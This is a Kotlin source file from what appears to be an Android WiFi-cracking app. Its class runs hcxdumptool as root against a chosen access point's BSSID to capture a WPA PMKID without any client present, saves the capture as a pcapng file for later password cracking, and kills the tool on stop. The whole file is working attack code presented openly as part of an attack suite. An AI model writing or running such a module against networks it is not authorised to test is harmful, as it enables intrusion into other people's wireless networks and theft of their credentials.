package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.BinaryInstaller
import com.wificracker.core.root.ShellExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class PmkidCapture @Inject constructor(
    private val shellExecutor: ShellExecutor,
    private val binaryInstaller: BinaryInstaller,
) : WifiAttack {
    companion object { private const val CAPTURE_DIR = "/data/local/tmp/wificracker/captures" }

    override fun execute(attack: Attack): Flow<String> = flow {
        shellExecutor.executeAsRoot("mkdir -p $CAPTURE_DIR")
        val outputFile = "$CAPTURE_DIR/pmkid_${attack.targetBssid.replace(":", "")}_${System.currentTimeMillis()}.pcapng"
        val binary = binaryInstaller.getBinaryPath("hcxdumptool")
        emit("[*] Capturing PMKID from ${attack.targetBssid} (no client needed)")
        val cmd = "$binary -i ${attack.interfaceName} --filterlist_ap=${attack.targetBssid} --filtermode=2 -o $outputFile"
        shellExecutor.executeAsRoot(cmd, timeoutSeconds = 60)
        emit("[+] PMKID capture saved to $outputFile")
    }.flowOn(Dispatchers.IO)

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill -f hcxdumptool")
    }
}
